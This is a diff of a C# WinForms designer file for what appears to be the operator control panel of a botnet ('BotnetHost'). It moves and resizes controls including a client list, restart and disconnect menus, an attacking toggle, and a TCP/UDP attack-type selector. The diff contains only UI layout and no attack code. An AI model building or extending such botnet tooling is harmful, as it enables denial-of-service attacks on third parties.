@@ -34,9 +34,11 @@ namespace BotnetHost
             this.serverPortLabel = new MetroFramework.Controls.MetroLabel();
             this.serverIPLabel = new MetroFramework.Controls.MetroLabel();
             this.serverIPV4Label = new MetroFramework.Controls.MetroLabel();
-            this.metroLabel10 = new MetroFramework.Controls.MetroLabel();
             this.serverToggle = new MetroFramework.Controls.MetroToggle();
+            this.metroLabel10 = new MetroFramework.Controls.MetroLabel();
             this.metroPanel3 = new MetroFramework.Controls.MetroPanel();
+            this.attackTypeComboBox = new MetroFramework.Controls.MetroComboBox();
+            this.metroLabel9 = new MetroFramework.Controls.MetroLabel();
             this.restartClientsBtn = new MetroFramework.Controls.MetroButton();
             this.applySettingsBtn = new MetroFramework.Controls.MetroButton();
             this.attackingToggle = new MetroFramework.Controls.MetroToggle();
@@ -66,8 +68,6 @@ namespace BotnetHost
             this.clientContextMenu = new MetroFramework.Controls.MetroContextMenu(this.components);
             this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.metroLabel9 = new MetroFramework.Controls.MetroLabel();
-            this.attackTypeComboBox = new MetroFramework.Controls.MetroComboBox();
             this.metroPanel4.SuspendLayout();
             this.metroPanel3.SuspendLayout();
             this.metroPanel1.SuspendLayout();
@@ -127,16 +127,6 @@ namespace BotnetHost
             this.serverIPV4Label.Theme = MetroFramework.MetroThemeStyle.Dark;
             this.serverIPV4Label.UseStyleColors = true;
             // 
-            // metroLabel10
-            // 
-            this.metroLabel10.Location = new System.Drawing.Point(658, 290);
-            this.metroLabel10.Name = "metroLabel10";
-            this.metroLabel10.Size = new System.Drawing.Size(287, 19);
-            this.metroLabel10.TabIndex = 11;
-            this.metroLabel10.Text = "Server Status\r\n";
-            this.metroLabel10.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
-            this.metroLabel10.Theme = MetroFramework.MetroThemeStyle.Dark;
-            // 
             // serverToggle
             // 
             this.serverToggle.CheckAlign = System.Drawing.ContentAlignment.MiddleCenter;
@@ -155,6 +145,16 @@ namespace BotnetHost
             this.serverToggle.UseSelectable = true;
             this.serverToggle.CheckedChanged += new System.EventHandler(this.serverToggle_CheckedChanged);
             this.serverToggle.Click += new System.EventHandler(this.settingsChanged);
+            // 
+            // metroLabel10
+            // 
+            this.metroLabel10.Location = new System.Drawing.Point(658, 290);
+            this.metroLabel10.Name = "metroLabel10";
+            this.metroLabel10.Size = new System.Drawing.Size(287, 19);
+            this.metroLabel10.TabIndex = 11;
+            this.metroLabel10.Text = "Server Status\r\n";
+            this.metroLabel10.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
+            this.metroLabel10.Theme = MetroFramework.MetroThemeStyle.Dark;
             // 
             // metroPanel3
             // 
@@ -188,6 +188,32 @@ namespace BotnetHost
             this.metroPanel3.VerticalScrollbarBarColor = true;
             this.metroPanel3.VerticalScrollbarHighlightOnWheel = false;
             this.metroPanel3.VerticalScrollbarSize = 10;
+            // 
+            // attackTypeComboBox
+            // 
+            this.attackTypeComboBox.FontSize = MetroFramework.MetroComboBoxSize.Small;
+            this.attackTypeComboBox.FormattingEnabled = true;
+            this.attackTypeComboBox.ItemHeight = 19;
+            this.attackTypeComboBox.Items.AddRange(new object[] {
+            "TCP",
+            "UDP"});
+            this.attackTypeComboBox.Location = new System.Drawing.Point(77, 75);
+            this.attackTypeComboBox.Name = "attackTypeComboBox";
+            this.attackTypeComboBox.PromptText = "TCP";
+            this.attackTypeComboBox.Size = new System.Drawing.Size(204, 25);
+            this.attackTypeComboBox.TabIndex = 23;
+            this.attackTypeComboBox.Theme = MetroFramework.MetroThemeStyle.Dark;
+            this.attackTypeComboBox.UseSelectable = true;
+            // 
+            // metroLabel9
+            // 
+            this.metroLabel9.Location = new System.Drawing.Point(3, 75);
+            this.metroLabel9.Name = "metroLabel9";
+            this.metroLabel9.Size = new System.Drawing.Size(68, 23);
+            this.metroLabel9.TabIndex = 22;
+            this.metroLabel9.Text = "Type:";
+            this.metroLabel9.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            this.metroLabel9.Theme = MetroFramework.MetroThemeStyle.Dark;
             // 
             // restartClientsBtn
             // 
@@ -462,16 +488,14 @@ namespace BotnetHost
             this.clientListView.Theme = MetroFramework.MetroThemeStyle.Dark;
             this.clientListView.UseCompatibleStateImageBehavior = false;
             this.clientListView.UseCustomBackColor = true;
-            this.clientListView.UseCustomForeColor = true;
             this.clientListView.UseSelectable = true;
-            this.clientListView.UseStyleColors = true;
             this.clientListView.View = System.Windows.Forms.View.Details;
             this.clientListView.MouseDown += new System.Windows.Forms.MouseEventHandler(this.clientListView_MouseDown);
             // 
             // clientColumn
             // 
             this.clientColumn.Text = "Client";
-            this.clientColumn.Width = 640;
+            this.clientColumn.Width = 635;
             // 
             // metroLabel1
             // 
@@ -498,6 +522,7 @@ namespace BotnetHost
             this.logListView.TabIndex = 5;
             this.logListView.Theme = MetroFramework.MetroThemeStyle.Dark;
             this.logListView.UseCompatibleStateImageBehavior = false;
+            this.logListView.UseCustomBackColor = true;
             this.logListView.UseSelectable = true;
             this.logListView.View = System.Windows.Forms.View.Details;
             this.logListView.MouseDown += new System.Windows.Forms.MouseEventHandler(this.activityLogListView_MouseDown);
@@ -537,47 +562,21 @@ namespace BotnetHost
             this.disconnectToolStripMenuItem,
             this.restartToolStripMenuItem});
             this.clientContextMenu.Name = "clientContextMenu";
-            this.clientContextMenu.Size = new System.Drawing.Size(181, 70);
+            this.clientContextMenu.Size = new System.Drawing.Size(134, 48);
             // 
             // disconnectToolStripMenuItem
             // 
             this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
-            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
             this.disconnectToolStripMenuItem.Text = "Disconnect";
             this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
             // 
             // restartToolStripMenuItem
             // 
             this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
-            this.restartToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.restartToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
             this.restartToolStripMenuItem.Text = "Restart";
             this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
-            // 
-            // metroLabel9
-            // 
-            this.metroLabel9.Location = new System.Drawing.Point(3, 75);
-            this.metroLabel9.Name = "metroLabel9";
-            this.metroLabel9.Size = new System.Drawing.Size(68, 23);
-            this.metroLabel9.TabIndex = 22;
-            this.metroLabel9.Text = "Type:";
-            this.metroLabel9.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
-            this.metroLabel9.Theme = MetroFramework.MetroThemeStyle.Dark;
-            // 
-            // attackTypeComboBox
-            // 
-            this.attackTypeComboBox.FontSize = MetroFramework.MetroComboBoxSize.Small;
-            this.attackTypeComboBox.FormattingEnabled = true;
-            this.attackTypeComboBox.ItemHeight = 19;
-            this.attackTypeComboBox.Items.AddRange(new object[] {
-            "TCP",
-            "UDP"});
-            this.attackTypeComboBox.Location = new System.Drawing.Point(77, 75);
-            this.attackTypeComboBox.Name = "attackTypeComboBox";
-            this.attackTypeComboBox.PromptText = "TCP";
-            this.attackTypeComboBox.Size = new System.Drawing.Size(204, 25);
-            this.attackTypeComboBox.TabIndex = 23;
-            this.attackTypeComboBox.Theme = MetroFramework.MetroThemeStyle.Dark;
-            this.attackTypeComboBox.UseSelectable = true;
             // 
             // MainPanel
             // 
